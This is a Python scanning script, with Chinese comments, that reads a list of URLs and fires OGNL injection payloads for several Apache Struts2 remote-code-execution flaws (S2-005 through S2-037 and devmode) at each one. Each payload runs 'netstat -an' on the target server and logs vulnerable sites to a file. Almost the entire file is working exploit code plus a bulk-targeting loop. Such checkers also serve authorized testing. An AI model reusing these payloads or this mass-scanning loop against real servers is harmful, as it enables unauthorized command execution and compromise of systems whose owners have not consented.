# # -*-coding:utf-8-*-
# import sys
# from PyQt5 import QtWidgets
# from ui.tianyi import TianYi
#
#
# def main():
#     app = QtWidgets.QApplication(sys.argv)
#     window = TianYi()
#     window.show()
#     sys.exit(app.exec_())
#
#
# if __name__ == '__main__':
#     main()
#

# -*-coding:utf-8-*-
import requests
import time
'''
使用说明：
  检测以下Struts2：
       struts2_005
       struts2_009
       struts2_013
       struts2_016
       struts2_019
       struts2_032
       struts2_037
       struts2_devmode 
'''
time.sleep(3)
zhaohan2 = open("url.txt",'r')
zhaohan3 = zhaohan2.readlines()
zhaohan2.close()
def struts2_005(urlx):  #检测的主要程序，建立检测005的函数
    zhaohan = open('success.txt','a+')
    headers = {"Content-Type": "application/x-www-form-urlencoded"}    #在下面构建exp
    exp = '''('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'netstat -an\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))'''


    try:  #当不能连接的时候可以实现异常处理
        resp = requests.post(url=urlx, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:   #当0.0.0.0 在返回的内容的时候说明是存在漏洞
            print("发现一枚嫌疑网址，保存到本地....")
            zhaohan.write(urlx + "    S2_005" + "\n")
        else:
             print("该网站不存在S2_005漏洞，继续扫描.....")
    except:
        print('连接超时&指令被禁止&或被拦截巴拉巴拉的~')
        return None
    return None
    zhaohan.close()
    time.sleep(3)


def struts2_009(urlx):
    zhaohan = open('success.txt','a+')
    exp = '''?class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]'''
    url = urlx + exp


    try:
        resp = requests.get(url, timeout=10)
        if "0.0.0.0" in resp.content:
            print("发现一枚嫌疑网址，保存到本地....")
            zhaohan.write(urlx + "    S2_009" + "\n")
        else:
             print("该网站不存在S2_009漏洞，继续扫描.....")
    except:
        print('连接超时&指令被禁止&或被拦截巴拉巴拉的~')
        return None
    return None
    zhaohan.close()
    time.sleep(3)


def struts2_013(urlx):
    zhaohan = open('success.txt','a+')
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('netstat -an').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}'''


    try:
        resp = requests.post(url=urlx, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            print("发现一枚嫌疑网址，保存到本地....")
            zhaohan.write(urlx + "    S2_013" + "\n")
        else:
             print("该网站不存在S2_013漏洞，继续扫描.....")
    except:
        print('连接超时&指令被禁止&或被拦截巴拉巴拉的~')
        return None
    return None
    zhaohan.close()
    time.sleep(3)




def struts2_016(urlx):
    zhaohan = open('success.txt','a+')
    exp = '''?redirect:$%7B%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B'netstat','-an'%7D)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader%20(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char%5B50000%5D,%23d.read(%23e),%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println%20(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D'''
    url = urlx + exp


    try:
        resp = requests.get(url, timeout=10)
        if "0.0.0.0" in resp.content:
            print("发现一枚嫌疑网址，保存到本地....")
            zhaohan.write(urlx + "    S2_016" + "\n")
        else:
             print("该网站不存在S2_016漏洞，继续扫描.....",'utf-8')
    except:
        print('连接超时&指令被禁止&或被拦截巴拉巴拉的~','utf-8')
        return None
    return None
    zhaohan.close()
    time.sleep(3)


def struts2_019(urlx):
    zhaohan = open('success.txt','a+')
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''?debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()'''
    url = urlx + exp


    try:
        resp = requests.post(url, data=exp, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            print("发现一枚嫌疑网址，保存到本地....",'utf-8')
            zhaohan.write(urlx + "    S2_019" + "\n")
        else:
             print("该网站不存在S2_019漏洞，继续扫描.....",'utf-8')
    except:
        print('连接超时&指令被禁止&或被拦截巴拉巴拉的~','utf-8')
        return None
    return None
    zhaohan.close()
    time.sleep(3)




def struts2_032(urlx):
    zhaohan = open('success.txt','a+')
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=netstat%20-an&pp=\\A&ppp=%20&encoding=UTF-8'''
    url = urlx + exp


    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
            print("发现一枚嫌疑网址，保存到本地....",'utf-8')
            zhaohan.write(urlx + "    S2_032" + "\n")
        else:
             print("该网站不存在S2_032漏洞，继续扫描.....",'utf-8')
    except:
        print('连接超时&指令被禁止&或被拦截巴拉巴拉的~','utf-8')
        return None
    return None
    zhaohan.close()
    time.sleep(3)




def struts2_devmode(urlx):
    zhaohan = open('success.txt','a+')
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    exp = '''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=123456789&command=netstat -an'''
    url = urlx + exp


    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if "0.0.0.0" in resp.content:
           print("发现一枚嫌疑网址，保存到本地....",'utf-8')
           zhaohan.write(urlx + "    S2_devmode" + "\n")
        else:
             print("该网站不存在S2_devmode漏洞，继续扫描.....",'utf-8')
    except:
        print('连接超时&指令被禁止&或被拦截巴拉巴拉的~','utf-8')
        return None
    return None
    zhaohan.close()
    time.sleep(3)


def struts2_037(urlx):
    zhaohan = open('success.txt','a+')
    s2037_poc = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=25F9E794323B453885F5181F1B624D0B"
    headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
            'Cookie': 'JSESSIONID=75C9ED1CD9345875BC5328D73DC76812',
            'referer': 'http://www.baidu.com/',
            }
    try:
        res = requests.post(url = urlx,data = s2037_poc,headers=headers,timeout=10)
        if res.status_code == 200 and "25F9E794323B453885F5181F1B624D0B" in res.content:
            print("发现一枚嫌疑网址，保存到本地....",'utf-8')
            zhaohan.write(urlx + "    S2_037" + "\n")
        else:
             print("该网站不存在S2_037漏洞，继续扫描.....",'utf-8')
    except:
        print('连接超时&指令被禁止&或被拦截巴拉巴拉的~','utf-8')
        return None
    return None
    zhaohan.close()
    time.sleep(3)






for zhaohan4 in zhaohan3:
    print("\n")
    print('当前检测的站点为:' + zhaohan4)
    urlx = (zhaohan4.strip('\n'))
    struts2_005(urlx)
    struts2_009(urlx)
    struts2_013(urlx)
    struts2_016(urlx)
    struts2_019(urlx)
    struts2_032(urlx)
    struts2_037(urlx)
    struts2_devmode(urlx)
    print ('------------------------------------')
print("扫描完毕！", 'utf-8')